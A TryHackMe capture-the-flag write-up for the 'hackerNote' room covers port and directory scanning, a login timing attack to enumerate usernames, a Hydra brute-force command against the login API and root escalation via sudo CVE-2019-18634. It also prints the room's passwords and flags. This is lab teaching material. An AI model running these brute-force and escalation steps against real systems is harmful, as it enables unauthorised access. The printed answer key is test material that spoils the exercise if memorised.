# 🕵️ hackerNote — TryHackMe Write-Up

> _A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit._  
> Room: **[hackerNote](https://tryhackme.com/room/hackernote)**

<p align="center">
  <img src="https://i.postimg.cc/Qd3Tghhn/ed445ff945c6004661d02abeafb652dd.png" alt="banner" />
  <br/>
  <a href="https://tryhackme.com/room/hackernote"><img src="https://img.shields.io/badge/TryHackMe-hackerNote-orange?logo=tryhackme&logoColor=white" /></a>
  <img src="https://img.shields.io/badge/Topics-Web%20%7C%20Timing%20Attacks%20%7C%20PrivEsc-blue" />
  <img src="https://img.shields.io/badge/Lang-Go-green?logo=go" />
</p>

---

## 📚 Table of Contents
- [About](#-about)
- [Topics](#-topics)
- [Appendix Archive](#-appendix-archive)
- [Task 1 — Reconnaissance](#-task-1---reconnaissance)
- [Task 2 — Investigate](#-task-2---investigate)
- [Task 3 — Exploit (Timing Attack)](#-task-3---exploit-timing-attack)
- [Task 4 — Attack Passwords](#-task-4---attack-passwords)
- [Task 5 — Escalate (Sudo CVE)](#-task-5---escalate-sudo-cve)
- [Task 6 — Comments & Further Reading](#-task-6---comments--further-reading)
- [Answers (Hidden)](#-answers-hidden)
- [Credits & Disclaimer](#-credits--disclaimer)

---

## 🔎 About
This is a clean, step-by-step write-up for the **hackerNote** CTF on TryHackMe. It focuses on enumerating usernames with a timing attack, building an efficient password wordlist, and exploiting **CVE-2019-18634** for privilege escalation. Spoilers (usernames, passwords, and flags) are **hidden by default** — click to reveal them if you want the answers.

---

## ✅ Topics
- Network Enumeration
- Web Enumeration
- Username timing attack
- Brute Forcing (http-post-form)
- **CVE-2019-18634** - Sudo 1.8.25p - `pwfeedback` Buffer Overflow

---

## 🗄️ Appendix Archive
Password to the provided appendix (hidden):
<details>
  <summary><strong>Reveal Appendix Password</strong></summary>
  
  ```txt
  1 kn0w 1 5h0uldn'7!
  ```
</details>

---

## 🧭 Task 1 — Reconnaissance

You're presented with a machine. First step: recon. Scan the machine with nmap and identify services.

```bash
kali@kali:~/CTFs/tryhackme/hackerNote$ sudo nmap -A -sS -sC -sV -O MACHINE_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 21:41 CET
Nmap scan report for MACHINE_IP
Host is up (0.040s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home - hackerNote
No exact OS matches for host...
Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds
```

**Which ports are open?** (numerical order)
```
22,80,8080
```

**What programming language is the backend written in?**  
```
Go
```

---

## 🕵️ Task 2 — Investigate

Click around the webapp. Create an account, observe API calls, and pay attention to timing differences in responses.

Directory brute force with Gobuster (examples):

```bash
kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
...
/login (Status: 301)
/notes (Status: 301)
/http%3A%2F%2Fwww (Status: 301)
... (truncated)
```

```bash
kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u http://MACHINE_IP:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
...
/login (Status: 301)
/notes (Status: 301)
... (truncated)
```

Accessible endpoints found:
- `http://MACHINE_IP/login/`
- `http://MACHINE_IP/notes/`
- `http://MACHINE_IP:8080/login/`
- `http://MACHINE_IP:8080/notes/`

View source of the login JS (`/login/login.js`) — it reveals how the frontend talks to the API:

```js
async function login() {
  const username = document.querySelector("#username").value;
  const password = document.querySelector("#password").value;
  const button = document.querySelector("#loginButton");
  button.disabled = true;
  document.querySelector("#status").textContent = "Logging you in...";
  const response = await postData("/api/user/login", {
    username: username,
    password: password,
  });
  console.log(response);
  if (response.status !== undefined && response.status !== "success") {
    document.querySelector("#status").textContent = "";
    document.querySelector("#errorMessage").textContent = response.status;
    button.disabled = false;
    return;
  }
  if (response.SessionToken !== undefined) {
    window.location = "/notes";
  }
}
```
The frontend also requests password hints:
```js
const response = await getData("/api/user/passwordhint/" + username);
```

Create user accounts and try invalid logins; notice the **timing difference** when a valid username is supplied. This is the vulnerability: the server only performs the expensive password check when the username exists.

---

## 🧨 Task 3 — Exploit (Timing Attack)

Use the timing difference to enumerate valid usernames. You can script timing measurements with Python (requests + time) or use the prewritten exploits at:
https://github.com/NinjaJc01/hackerNoteExploits

Example pseudocode for timing measurement:
```py
start = time.time()
r = requests.post("http://MACHINE_IP/api/user/login", json={"username": user, "password": "invalid!"})
end = time.time()
delta = end - start
```

Repeat over a username list and treat responses close to the maximum observed time as likely valid usernames (e.g., within 10%).

> Pre-made exploits exist in Golang and Python. The Golang one is faster but less reliable; re-run if you get inconsistent results.

**How many usernames from the list are valid?**  
<details><summary><strong>Reveal answer</strong></summary>

```
1
```
</details>

**What are/is the valid username(s)?**  
<details><summary><strong>Reveal username(s)</strong></summary>

```
james
```
</details>

---

## 🔐 Task 4 — Attack Passwords

With the valid username, fetch the password hint:

```http
GET /api/user/passwordhint/james
```

The hint: _"my favourite colour and my favourite number"_. Use two small lists (colors + numbers) and combine them with Hashcat Utils' `combinator.bin` to make a compact wordlist:

```bash
./combinator.bin colors.txt numbers.txt > wordlist.txt
wc -l wordlist.txt
# 180
```

Hydra can attack the API (the API accepts either form-encoded or JSON — we'll use http-post-form):
```
hydra -l james -P wordlist.txt MACHINE_IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```
Result (hidden):
<details><summary><strong>Reveal User Password</strong></summary>

```
blue7
```
</details>

SSH password (as noted in the lab):
<details><summary><strong>Reveal SSH password</strong></summary>

```
dak4ddb37b
```
</details>

Login via SSH and retrieve the user flag (hidden):
<details><summary><strong>User Flag</strong></summary>

```
thm{56911bd7ba1371a3221478aa5c094d68}
```
</details>

---

## 🧩 Task 5 — Escalate (Sudo CVE)

Enumerate privileges and try `sudo -l`:

```bash
james@hackernote:~$ sudo -l
[sudo] password for james: **********
```
The system shows password feedback (asterisks). This is vulnerable to **CVE-2019-18634** which affects `pwfeedback` in certain `sudo` versions (1.8.25p and similar).

**CVE:** `CVE-2019-18634`

Exploit workflow (summary):
1. Download exploit from https://github.com/saleemrashid/ (search for CVE-2019-18634).
2. Compile exploit on Kali (or build locally), then `scp` binary to the target.
3. Run the exploit on the box and escalate to root.

Example session after successful exploit (truncated to relevant parts):
```bash
james@hackernote:~$ ls -la
... exploit present ...
james@hackernote:~$ ./exploit
[sudo] password for james:
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1001(james)
# cat /root/root.txt
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```

**Root flag** (hidden):
<details><summary><strong>Reveal Root Flag</strong></summary>

```
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```
</details>

---

## 🧾 Task 6 — Comments on realism & Further Reading

**Web app**  
This room demonstrates realistic mistakes: timing differences in authentication and insecure password hinting. OWASP details timing attack considerations in its authentication testing.

**Privilege Escalation**  
CVE-2019-18634 is a real-world vulnerability that affected `sudo` configurations exposing `pwfeedback`. It impacted some Linux/macOS setups.

**Further reading**
- Timing attacks on logins / username enumeration: https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)  
- CVE analysis: https://dylankatz.com/Analysis-of-CVE-2019-18634/  
- NVD entry: https://nvd.nist.gov/vuln/detail/CVE-2019-18634  
- TryHackMe sudo lab: https://tryhackme.com/room/sudovulnsbof

---

## ⚠️ Answers (Hidden)
Click to reveal all sensitive answers used in this write-up.

<details>
  <summary><strong>Valid usernames (from list)</strong></summary>
  ```
1
  ```
</details>

<details>
  <summary><strong>Valid username(s)</strong></summary>
  ```
james
  ```
</details>

<details>
  <summary><strong>User's password (web)</strong></summary>
  ```
blue7
  ```
</details>

<details>
  <summary><strong>SSH password</strong></summary>
  ```
dak4ddb37b
  ```
</details>

<details>
  <summary><strong>User flag</strong></summary>
  ```
thm{56911bd7ba1371a3221478aa5c094d68}
  ```
</details>

<details>
  <summary><strong>Root flag</strong></summary>
  ```
thm{af55ada6c2445446eb0606b5a2d3a4d2}
  ```
</details>

---

## 🙏 Credits & Disclaimer
- **Room Author:** TryHackMe room `hackerNote` (lab content used for education).  
- **Exploit sources:** saleemrashid (CVE exploit), NinjaJc01 (timing exploit repo)  
- This repository is for **learning only**. Do **not** apply techniques against systems without explicit authorization.

  ---

### ⭐ If this helped you, consider leaving a star on the repo!
